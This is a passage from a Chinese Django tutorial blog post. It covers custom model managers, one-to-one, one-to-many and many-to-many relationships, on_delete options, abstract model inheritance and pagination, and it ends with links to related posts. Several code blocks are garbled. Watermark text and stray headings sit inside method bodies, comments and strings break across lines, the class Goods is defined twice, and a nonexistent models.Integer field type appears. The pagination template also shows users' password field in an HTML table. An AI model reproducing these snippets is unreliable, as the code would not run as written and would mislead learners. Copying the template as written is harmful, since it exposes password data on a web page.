title="重命名管理器"></a>重命名管理器</h3><p>在模型类中⾃定义⼀个新的管理器，则原有的objects管理器不会存在，以后对数 据库的操作使⽤⾃⼰定义的管理器</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#模型类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Artical</span>(models.Model):</span><br><span class="line"> aid = models.AutoField(primary_key=<span class="literal">True</span>)</span><br><span class="line"> title = models.CharField(max_length=<span class="number">100</span>,null=<span class="literal">False</span>)</span><br><span class="line"> content = models.TextField(max_length=<span class="number">10000</span>,null=<span class="literal">True</span>)</span><br><span class="line"> ....</span><br><span class="line"> art_manager = models.Manager() <span class="comment">#⾃定义了⼀个新的管理器，名字为</span></span><br><span class="line">art_manager</span><br><span class="line"><span class="comment">#views</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">article_get</span>(<span class="params">request</span>):</span><br><span class="line"> articles = Artical.art_manager.<span class="built_in">all</span>() <span class="comment">#使⽤art_manager进⾏查询</span></span><br><span class="line"> <span class="keyword">return</span> render(request,<span class="string">&quot;articlelist.html&quot;</span>,context=</span><br><span class="line">&#123;<span class="string">&#x27;articls&#x27;</span>:articles&#125;)</span><br></pre></td></tr></table></figure><h3 id="自定义管理器"><a href="#自定义管理器" class="headerlink" title="自定义管理器"></a>自定义管理器</h3><ul><li>修改原始查询集（由all()获取的查询集）<ul><li>修改管理器的get_queryset⽅法，可以改变all⽅法返回的原始查询集(实现自动过滤)</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#⾸先⾃定义Manager的⼦类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ArticleManager</span>(models.Manager):</span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">get_queryset</span>(<span class="params">self</span>):</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">super</span>().get_queryset().<span class="built_in">filter</span>(ispublished=<span class="literal">True</span>) <span class="comment">#</span></span><br><span class="line">获取已发表的⽂章</span><br><span class="line"><span class="comment">#模型类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Artical</span>(models.Model):</span><br><span class="line"> ....</span><br><span class="line"> objects = models.Manager() <span class="comment">#可以有多个管理器</span></span><br><span class="line"> publishManager = ArticleManager()</span><br><span class="line"><span class="comment">#views</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">article_publish</span>(<span class="params">request</span>):</span><br><span class="line"> published = Artical.publishManager.<span class="built_in">all</span>()</span><br><span class="line"> <span class="keyword">return</span> HttpResponse(<span class="string">&quot;已经发表&#123;&#125;&quot;</span>.<span class="built_in">format</span>(published[<span class="number">0</span>].title))</span><br></pre></td></tr></table></figure><ul><li>给管理器类中添加额外的⽅法</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ArticleManager</span>(models.Manager):</span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">get_queryset</span>(<span class="params">self</span>):</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">super</span>().get_queryset().<span class="built_in">filter</span>(ispublished=<span class="literal">True</span>)</span><br><span class="line">千锋python学院</span><br><span class="line"> <span class="comment">#新增⼀个创建对象的⽅法</span></span><br><span class="line"> <span class="keyword">def</span></span><br><span class="line"><span class="title function_">create</span>(<span class="params">self,title,content,publishingdate,comments,likenum,ispubli</span></span><br><span class="line"><span class="params">shed</span>):</span><br><span class="line"> article = Artical()</span><br><span class="line"> article.title = title</span><br><span class="line"> article.content = content</span><br><span class="line"> article.publishingdate = publishingdate</span><br><span class="line"> article.comments = comments</span><br><span class="line"> article.likenum = likenum</span><br><span class="line"> article.ispublished = ispublished</span><br><span class="line"> article.save()</span><br><span class="line"> <span class="keyword">return</span> article</span><br><span class="line"><span class="comment">#views.py中</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">article_add</span>(<span class="params">request</span>):</span><br><span class="line"> <span class="comment"># art = Artical(title=&#x27;⼩时代&#x27;,content=&quot;混乱的逻辑&quot;)</span></span><br><span class="line"> <span class="comment"># art.save()</span></span><br><span class="line"> Artical.publishManager.create(<span class="string">&#x27;中美贸易战&#x27;</span>,<span class="string">&#x27;川朴⼀⾖⽐&#x27;</span>,<span class="string">&#x27;2018-</span></span><br><span class="line"><span class="string">10-8&#x27;</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line"> <span class="keyword">return</span> HttpResponse(<span class="string">&quot;保存成功&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="模型对应关系"><a href="#模型对应关系" class="headerlink" title="模型对应关系"></a>模型对应关系</h2><p>关系数据库最强⼤大的地⽅方在于“关系”，也即表和表之间是有关联的，这种关联有三 种类型：</p><ul><li>一对一</li><li>一对多</li><li>多对多</li></ul><p>一个学⽣生有⼀一个档案，一个档案属于一个学⽣生，那么学⽣生表和档案表就是一对一关 系。学生表是主表，档案表是从表，从表中有一个外键和学生表关联，并且要求外键取值唯一。对应关键字为：OneToOneField</p><h3 id="一对一"><a href="#一对一" class="headerlink" title="一对一"></a>一对一</h3><ul><li>创建模型</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>(models.Model):</span><br><span class="line"> sno = models.CharField(max_length=<span class="number">6</span>,primary_key=<span class="literal">True</span>)</span><br><span class="line"> sname = models.CharField(max_length=<span class="number">100</span>,null=<span class="literal">False</span>)</span><br><span class="line"> ssex = models.CharField(max_length=<span class="number">2</span>,default=<span class="string">&#x27;男&#x27;</span>,null=<span class="literal">True</span>)</span><br><span class="line"> sage = models.IntegerField(null=<span class="literal">True</span>)</span><br><span class="line"> sclass = models.CharField(max_length=<span class="number">10</span>,null=<span class="literal">True</span>)</span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line"> <span class="keyword">return</span> <span class="string">&quot;no:&#123;&#125;,name:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.sno,self.sname)</span><br><span class="line"> <span class="keyword">class</span> <span class="title class_">Meta</span>:</span><br><span class="line"> db_table = <span class="string">&#x27;student&#x27;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Archives</span>(models.Model):</span><br><span class="line"> idcard = models.CharField(max_length=<span class="number">18</span>, unique=<span class="literal">True</span>)</span><br><span class="line"> address = models.CharField(max_length=<span class="number">200</span>,null=<span class="literal">True</span>)</span><br><span class="line"> <span class="comment"># on_delete=models.CASCADE 级联删除，删除学⽣会连同档案⼀块删除</span></span><br><span class="line"> student = models.OneToOneField(Student, on_delete=models.CASCADE)</span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">千锋python学院</span><br><span class="line">增加数据</span><br><span class="line">删除数据</span><br><span class="line">正向查询</span><br><span class="line">反向查询</span><br><span class="line"> <span class="keyword">return</span> <span class="string">&quot;&#123;&#125;,&#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.idcard,self.address)</span><br><span class="line"> <span class="keyword">class</span> <span class="title class_">Meta</span>:</span><br><span class="line"> db_table = <span class="string">&#x27;archives&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>添加数据</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">addstudent</span>(<span class="params">request</span>):</span><br><span class="line"> student = Student()</span><br><span class="line"> student.sno = <span class="string">&#x27;180502&#x27;</span></span><br><span class="line"> student.sname = <span class="string">&#x27;杨康&#x27;</span></span><br><span class="line"> student.sage = <span class="number">22</span></span><br><span class="line"> student.save()</span><br><span class="line"> <span class="keyword">return</span> HttpResponse(<span class="string">&quot;增加了⼀个学⽣&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addarchives</span>(<span class="params">request</span>):</span><br><span class="line"> stu = Student.objects.get(pk=<span class="string">&#x27;180503&#x27;</span>)</span><br><span class="line"> arc = Archives()</span><br><span class="line"> arc.idcard = <span class="string">&#x27;130098384893838953&#x27;</span></span><br><span class="line"> arc.student = stu <span class="comment">#学⽣对象必须已经保存到数据库，否则错误</span></span><br><span class="line"> arc.save()</span><br><span class="line"> <span class="keyword">return</span> HttpResponse(<span class="string">&quot;增加档案&quot;</span>)</span><br></pre></td></tr></table></figure><ul><li>删除数据</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">deletestudent</span>(<span class="params">request</span>):</span><br><span class="line"> student = Student.objects.get(pk=<span class="string">&#x27;180503&#x27;</span>)</span><br><span class="line"> student.delete()</span><br><span class="line"> <span class="keyword">return</span> HttpResponse(<span class="string">&quot;删除学⽣&quot;</span>)</span><br></pre></td></tr></table></figure><ul><li>正向查询</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">findstudent</span>(<span class="params">request</span>):</span><br><span class="line"> <span class="comment"># 获取学⽣信息</span></span><br><span class="line"> student = Student.objects.first()</span><br><span class="line"> <span class="built_in">print</span>(student)</span><br><span class="line"> <span class="comment"># 通过学⽣对象获取档案信息</span></span><br><span class="line"> archive = student.archives</span><br><span class="line"> <span class="built_in">print</span>(archive)</span><br><span class="line"> <span class="keyword">return</span> HttpResponse(student)</span><br></pre></td></tr></table></figure><ul><li>反向查询</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">findarchives</span>(<span class="params">request</span>):</span><br><span class="line"> <span class="comment">#获取档案记录</span></span><br><span class="line"> archive = Archives.objects.first()</span><br><span class="line"> <span class="comment">#通过档案获取关联学⽣信息</span></span><br><span class="line"> student = archive.student</span><br><span class="line"> <span class="keyword">return</span> HttpResponse(student)</span><br></pre></td></tr></table></figure><ul><li>跨关系查询</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">def lookup(request):</span><br><span class="line"> #根据档案查学⽣</span><br><span class="line"> # student = Student.objects.get(archives__pk=1)</span><br><span class="line"> student =</span><br><span class="line">Student.objects.get(archives__idcard=&#x27;13009488384383838&#x27;)</span><br><span class="line"> #根据学⽣查档案</span><br><span class="line"> archive = Archives.objects.get(student__sno=&#x27;180501&#x27;)</span><br><span class="line"> return HttpResponse(archive)</span><br></pre></td></tr></table></figure><ul><li>on_delete<ul><li>CASECADE 默认，默认级联删除数据</li><li>PROTECT 保护模式，当从表中存在级联记录的时候，删除主表记录会抛 出保护异常，从表中不存在级联数据的时候，是允许删除的</li><li>SET_XXX<ul><li>NULL 外键字段本身必须允许为空</li><li>DEFAULT 外键字段本身有默认值</li></ul></li><li>DO_NOTHING 什么都不做</li></ul></li></ul><h3 id="一对多"><a href="#一对多" class="headerlink" title="一对多"></a>一对多</h3><p>⼀个出版社可以出版多本书，⼀本书只能被⼀个出版社出版。出版社和图书表属于 ⼀对多，⼀对多⼀般将主表中的主键并到从表中做外键。在模型中⽤ForeignKey表 示多对⼀</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Publisher</span>(models.Model):</span><br><span class="line"> pname = models.CharField(max_length=<span class="number">100</span>,null=<span class="literal">True</span>)</span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line"> <span class="keyword">return</span> self.pname</span><br><span class="line">千锋python学院</span><br><span class="line">增加</span><br><span class="line">删除和更新</span><br><span class="line">正向查询</span><br><span class="line"> <span class="keyword">class</span> <span class="title class_">Meta</span>:</span><br><span class="line"> db_table = <span class="string">&#x27;publisher&#x27;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Book</span>(models.Model):</span><br><span class="line"> bname = models.CharField(max_length=<span class="number">200</span>,null=<span class="literal">True</span>)</span><br><span class="line"> <span class="comment">#多对⼀模型通过ForeignKey表示多对⼀</span></span><br><span class="line"> <span class="comment">#如果publisher定义在book之后，第⼀个参数应该⽤字符串&#x27;Publisher&#x27;</span></span><br><span class="line"> publisher = models.ForeignKey(Publisher,on_delete=models.CASCADE,</span><br><span class="line"> null=<span class="literal">True</span>,</span><br><span class="line"> db_column=<span class="string">&#x27;pid&#x27;</span>, <span class="comment">#表中字段名</span></span><br><span class="line"> related_name=<span class="string">&#x27;books&#x27;</span>) <span class="comment">#通过出版社</span></span><br><span class="line">查图书时使⽤的关系名</span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line"> <span class="keyword">return</span> self.bname</span><br><span class="line"> <span class="keyword">class</span> <span class="title class_">Meta</span>:</span><br><span class="line"> db_table = <span class="string">&#x27;book&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="多对多"><a href="#多对多" class="headerlink" title="多对多"></a>多对多</h3><p>⼀个买家可以购买多件商品，⼀件商品可以被多个买家购买，买家和商品之间构成 多对多关系，多对多关系必然会⽣成⼀张中间表：买家-商品表，记录商品和买家 的关系，该表包含商品表主键和买家表的主键</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"><span class="comment"># Create your models here.</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Buyer</span>(models.Model):</span><br><span class="line"> bname = models.CharField(max_length=<span class="number">30</span>)</span><br><span class="line"> level = models.IntegerField(default=<span class="number">1</span>)</span><br><span class="line">千锋python学院</span><br><span class="line">购买商品</span><br><span class="line">删除商品</span><br><span class="line">正向查询</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Goods</span>(models.Model):</span><br><span class="line"> gname = models.CharField(max_length=<span class="number">100</span>)</span><br><span class="line"> price = models.FloatField()</span><br><span class="line"> buyer = models.ManyToManyField(Buyer) <span class="comment">#这种写法⾃动⽣成第三张表，但</span></span><br><span class="line">我们⽆法直接控制</span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line"> <span class="keyword">return</span> self.gname +<span class="string">&quot; &quot;</span>+ <span class="built_in">str</span>(self.price)</span><br><span class="line"><span class="comment">#⼿动创建中间表</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Orders</span>(models.Model):</span><br><span class="line"> buyer =</span><br><span class="line">models.ForeignKey(Buyer,on_delete=models.CASCADE,db_column=<span class="string">&#x27;bid&#x27;</span>)</span><br><span class="line"> goods =</span><br><span class="line">models.ForeignKey(<span class="string">&#x27;Goods&#x27;</span>,on_delete=models.CASCADE,db_column=<span class="string">&#x27;gid&#x27;</span>)</span><br><span class="line"> num = models.Integer(default=<span class="number">1</span>)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Goods</span>(models.Model):</span><br><span class="line"> gname = models.CharField(max_length=<span class="number">100</span>)</span><br><span class="line"> price = models.FloatField()</span><br><span class="line"> buyer = models.ManyToManyField(Buyer,through=<span class="string">&#x27;Orders&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="模型继承"><a href="#模型继承" class="headerlink" title="模型继承"></a>模型继承</h2><p>django中的数据库模块提供了⼀个非常不错的功能，就是⽀持models的面向对 象，可以在models中添加Meta，指定是否抽象，然后进⾏继承。父类的嵌套类中有一个abstract参数，这个参数告诉Django怎么操作数据库。</p><p>当abstract为False时：DJango会创建两个表，一个子表一个父表，子表不会只有子类里的定义的属性</p><p>当abstract为True时：Django只会创建子表，不会创建父类表，生成表列为父类属性+子类属性</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span>(models.Model):</span><br><span class="line"><span class="comment"># 列属性</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Meta</span>:</span><br><span class="line">abstract = <span class="literal">True</span>/<span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>(<span class="title class_ inherited__">Animal</span>):</span><br><span class="line"><span class="comment"># 列属性</span></span><br></pre></td></tr></table></figure><h2 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h2><h3 id="Paginator-分页器"><a href="#Paginator-分页器" class="headerlink" title="Paginator 分页器"></a>Paginator 分页器</h3><p>分页是把数据按照一页多少个输出，Paginator⽤于分⻚，但Paginator并不具体管理具体的⻚的处理，而是使⽤Page 对象管理具体页面。</p><ul><li>创建分⻚器对象</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">paginator = Paginator(users, <span class="number">10</span>)<span class="comment">#paginator是返回对象，Paginator是Django提供的分页管理器，需要导入</span></span><br></pre></td></tr></table></figure><ul><li>返回对象的属性<ul><li>对象.count  分页对象的个数</li><li>对象.num_pages 总页数</li><li>对象.page_range 页码的列表</li></ul></li><li>⽅法<ul><li>page(num) 返回page对象 如果给定的页码不存在 则抛出异常</li></ul></li></ul><h3 id="page-对象"><a href="#page-对象" class="headerlink" title="page 对象"></a>page 对象</h3><p>page对象是调用创建分页管理器返回的对象的方法返回的对象，具体负责每页的处理，包括每页的数据，当前页的页码，是否有上⼀⻚ 或下⼀页等。</p><table><thead><tr><th>类别</th><th>名称</th><th>说明</th></tr></thead><tbody><tr><td>属性</td><td>object_list</td><td>当前页码上的所有数据(QuerySet)</td></tr><tr><td>属性</td><td>number</td><td>当前页码值</td></tr><tr><td>属性</td><td>paginator</td><td>返回Paginator的对象</td></tr><tr><td>方法</td><td>has_next</td><td>是否有下⼀页</td></tr><tr><td>方法</td><td>has_previous</td><td>是否有上⼀页</td></tr><tr><td>方法</td><td>has_other_pages</td><td>是否有上⼀页或者下⼀页</td></tr><tr><td>方法</td><td>next_page_number</td><td>返回下⼀页的页码</td></tr><tr><td>方法</td><td>previous_page_number</td><td>返回上⼀页的页码</td></tr><tr><td>方法</td><td>len</td><td>返回当前页数据的个数</td></tr></tbody></table><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><ul><li>视图代码</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">page</span>(<span class="params">request, page=<span class="number">1</span></span>):</span><br><span class="line">    users = User.objects.<span class="built_in">all</span>()</span><br><span class="line">    paginator = Paginator(users, <span class="number">20</span>)</span><br><span class="line">    num_pages = paginator.num_pages</span><br><span class="line">    pager = paginator.page(page)</span><br><span class="line">    page_list = pager.object_list</span><br><span class="line">    number = pager.number</span><br><span class="line">    next_page = page + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> next_page &gt; num_pages:</span><br><span class="line">        next_page = <span class="number">1</span></span><br><span class="line">    previous_page = page - <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> previous_page == <span class="number">0</span>:</span><br><span class="line">        previous_page = num_pages</span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">&#x27;list.html&#x27;</span>, <span class="built_in">locals</span>())</span><br></pre></td></tr></table></figure><ul><li>模板代码</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>用户列表<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">&quot;1&quot;</span> <span class="attr">cellspacing</span>=<span class="string">&quot;0&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100%&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>ID<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>用户名<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>密码<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">            &#123;% for user in page_list %&#125;</span><br><span class="line">                <span class="tag">&lt;<span class="name">tr</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; user.id &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; user.username &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; user.password &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">            &#123;% endfor %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line">    &#123;% for page in paginator.page_range %&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&#123;% url &#x27;user:page&#x27; page=page%&#125;&quot;</span>&gt;</span>&#123;&#123; page &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/user/page/&#123;&#123; previous_page &#125;&#125;&quot;</span>&gt;</span>上一页<span class="tag">&lt;/<span class="name">a</span>&gt;</span> 共 &#123;&#123; num_pages &#125;&#125; 页 当前第&#123;&#123; number &#125;&#125;页  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/user/page/&#123;&#123; next_page &#125;&#125;&quot;</span>&gt;</span>下一页<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Django-系列文章"><a href="#Django-系列文章" class="headerlink" title="Django 系列文章"></a>Django 系列文章</h2><p>Django基础学习：<a href="https://www.xpctf.cn/posts/24c5/">https://www.xpctf.cn/posts/24c5/</a><br>Django晋级学习：<a href="https://www.xpctf.cn/posts/2f99/">https://www.xpctf.cn/posts/2f99/</a><br>Django模型学习：<a href="https://www.xpctf.cn/posts/d0b4/">https://www.xpctf.cn/posts/d0b4/</a><br>Django会话学习：<a href="https://www.xpctf.cn/posts/7490/">https://www.xpctf.cn/posts/7490/</a><br>Django Form学习：正在写</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
          <category> Django </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Django </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django晋级学习</title>
      <link href="/posts/2f99/"/>
      <url>/posts/2f99/</url>
      
